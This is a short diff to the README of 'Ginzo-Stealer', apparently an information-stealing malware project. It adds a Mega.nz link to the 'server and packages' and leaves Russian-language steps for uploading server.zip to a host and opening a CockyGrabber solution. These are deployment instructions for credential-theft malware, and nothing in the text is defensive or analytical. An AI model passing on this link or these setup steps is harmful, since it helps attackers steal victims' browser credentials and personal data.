@@ -1,5 +1,8 @@
 # Ginzo-Stealer
 
+Server and packages
+https://mega.nz/file/C7QUnAqB#ZFHkW-LGh-IU6hJkmlvcLLqECy-4vfMRR_oaHZR4oVg
+
 Закидываем все, что в server.zip на хост
 
 Открываем CockyGrabber.sln
